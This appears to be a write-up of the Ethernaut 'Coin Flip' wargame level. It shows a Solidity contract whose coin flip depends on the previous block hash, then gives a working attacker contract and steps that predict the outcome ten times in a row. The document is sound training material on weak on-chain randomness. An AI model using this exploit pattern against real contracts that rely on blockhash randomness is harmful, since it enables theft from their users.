# Ethernaut Coin Flip Level Attack

## Goal 

Build up your winning streak by guessing the outcome of a coinflip.

---

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

## Root cause

```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```

The value is known inside the contract during the current transaction instead of a random value. So deploying an attacker contract that calculates the same `side` before calling `flip()`

## Attack contract 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public coinFlip;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlip = ICoinFlip(_coinFlipAddress);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlipResult = blockValue / FACTOR;

        bool guess = coinFlipResult == 1 ? true : false;

        coinFlip.flip(guess);
    }
}

```

## Attack plan

Step 1: Deploy CoinFlipAttack with the addres of the vulnerable CoinFlip contract

Step 2: Call `attack()` function once per block, 10 times as the flow is:

Deploy attacker contract
Call attack() → win 1
Wait for next block
Call attack() → win 2
Wait for next block
...
Call attack() → win 10

Step 3: After 10 successful calls: 
```solidity
consecutiveWins == 10
```